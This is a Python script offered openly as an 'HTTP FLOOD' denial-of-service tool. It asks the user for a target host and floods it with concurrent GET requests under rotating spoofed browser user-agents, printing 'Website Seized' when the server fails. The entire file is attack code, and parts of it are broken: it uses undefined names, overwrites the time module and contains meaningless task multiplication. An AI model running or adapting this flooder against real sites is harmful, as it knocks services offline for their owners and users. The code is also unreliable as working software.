import asyncio
import aiohttp
import random
import time

def banner():
  print("")
  print('''
╦ ╦╔╦╗╔╦╗╔═╗  ╔═╗╦  ╔═╗╔═╗╔═╗
╠═╣ ║  ║ ╠═╝  ╠╣ ║  ║ ║║ ║ ║║
╩ ╩ ╩  ╩ ╩    ╚  ╩═╝╚═╝╚═╝╚╩╝
 ===========================
 [ The DoS Tool HTTP FLOOD ]
 [ Warning : No Attack GOV ]
 [           Sites         ]
 [ Copyright : Pham Chien  ]
 ===========================''')
  print("")

banner()
host = input("Host : ")

user_agent = [
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",
  "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H321 Safari/600.1.4",
  "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",
  "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H321 Safari/600.1.4",
  "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MSBrowserIE; rv:11.0) like Gecko",
  "Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-N910V 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.2; rv:40.0) Gecko/20100101 Firefox/40.0",
  "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0",
  "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/6.0.51363 Mobile/12H143 Safari/600.1.4",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101 Firefox/41.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
]

while True: 
  async def send_attack(user_agent, send_attack):
    num = 0
    async with aiohttp.ClientSession() as client:
      for i in range(0, 10000):
        num += i + 1
        for user_agents in user_agent:
          thrs = []
          clients = random.choice(user_agent)
          headers = {"User-Agent": clients} 
          async with client.get(host, headers=headers) as request:
            if request.status == 200:
              print(f"[{num}] Packet Done : {send_attack}")
            else:
              print(f"[{num}] Website Seized !!!")

            await request.text()
            time.sleep(0.00)

  async def main():
    num_attack = int(input("Num Packet (MAX : 9000) : "))

    thread = []
    tasks = []
    respon = []
    for attacking in range(num_attack):
      res = asyncio.ensure_future(send_attack(user_agent, send_attack))
      task = asyncio.ensure_future(send_attack(user_agent, send_attack))
      sock = asyncio.ensure_future(send_attack(user_agent, send_attack))
      respon.append(sock)
      tasks.append(res)
      thread.append(task)

    await asyncio.gather(*thread * num_attack, await asyncio.gather(*tasks * num_attack), await asyncio.gather(*respon * num_attack))
    await asyncio.gather(*thread * num_attack, await asyncio.gather(*tasks * num_attack), await asyncio.gather(*respon * num_attack))
    await asyncio.gather(*thread * num_attack, await asyncio.gather(*tasks * num_attack), await asyncio.gather(*respon * num_attack))
    await asyncio.gather(*thread * num_attack, await asyncio.gather(*tasks * num_attack), await asyncio.gather(*respon * num_attack))

    async with aiohttp.ClientSession(headers=headers) as session:
      async with client.get(host, headers=headers) as request:
        print("DONE")
        time.sleep(0.00)
        
  if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
    
  print("[+] KILLED")

  while True:
    for back in range(1000):
    # attacking part 2
      def num_sockets(host):
        response = request.get(host, headers=headers)
        print("RANDOOM CHOICE BOOM !!")

      if __name__ == '__main__':
        num_resquest = 5000

        time = 0.00 
        data = {'key': 'value'}
        threads = []

        for y in range(num_resquest):
          t = threading.Thread(target=num_sockets, args=(host,))
          r = threading.Thread(target=num_sockets, args=(host,))
          threads.append(t)
          threads.append(r)
          time.sleep(time)
          t.start(0)
          r.start(0)

        for t in threads:
          t.join(0)
          r.join(0)

        for r in threads:
          r.join(0)
          t.join(0)
